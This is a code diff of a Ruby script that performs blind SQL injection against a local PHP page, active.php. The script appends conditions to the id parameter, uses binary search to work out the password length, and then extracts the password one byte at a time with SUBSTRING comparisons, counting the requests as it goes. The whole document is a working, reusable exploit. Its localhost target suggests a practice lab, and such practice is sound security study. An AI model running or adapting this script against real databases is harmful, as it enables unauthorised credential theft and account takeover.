@@ -1,15 +1,19 @@
 require 'open-uri'
 
 END {    
+    total_request = 0
     password_length = guess_value{ |value|
-        URI.open("http://localhost:8000/active.php?id=4 and CHAR_LENGTH(password) > #{value}").read.include?  "is"
+        total_request+=1
+        URI.open("http://localhost:8000/active.php?id=#{ARGV.first} and CHAR_LENGTH(password) > #{value}").read.include?  "is"
     }
     puts "the length is: #{password_length}"
     
-    password = find_password(password_length){ |value|
-        URI.open("http://localhost:8000/active.php?id=4 and password LIKE BINARY \"#{value}\"").read.include?  "is"
+    password = find_password(password_length){ |n,byte|
+        total_request+=1
+        URI.open("http://localhost:8000/active.php?id=#{ARGV.first} and SUBSTRING(password,#{n},1) collate utf8_bin >  CHAR(#{byte} USING UCS2)").read.include?  "account"
     }
-    puts "the password is: #{password}"
+    puts "\nthe password is: #{password}"
+    puts "total of request: #{total_request}"
 }
 
 SQL_WILDCARDS="%_[]^-'"
@@ -17,7 +21,6 @@ def guess_value
     max_value = 1
     max_value *= 2 while yield max_value
     min_value = max_value / 2
-    puts "max: #{max_value} | min: #{min_value}"
     
     loop do
         value = (max_value - min_value) / 2 + min_value
@@ -27,23 +30,20 @@ def guess_value
         else
             max_value = value
         end 
-        return max_value if (max_value - min_value) <= 1
+        if (max_value - min_value) <= 1
+            return max_value  
+        end
     end
 end
 
 def find_password password_length
-    # uri = "http://localhost/active.php?id=3 and length(password) like #{password}"
-    value=""
-    password_length.times do
-        for i in 33..nil 
-            char = SQL_WILDCARDS.include?(i.chr(Encoding::UTF_8))? "\\#{i.chr(Encoding::UTF_8)}" : i.chr(Encoding::UTF_8)
-            result = yield URI.escape("#{value}#{char}%")
-            print "\r#{value}#{char}"
-            if result
-                value += char
-                break;                
-            end
-        end
+    password=""
+    password_length.times do |n|
+        password+=guess_value { |byte| 
+            yield n+1,byte
+        }.chr(Encoding::UTF_8) 
+        print "\rPassword : #{password.sub(/[^[:print:]]/,"")}"
     end
-    return value
+    puts
+    return password
 end
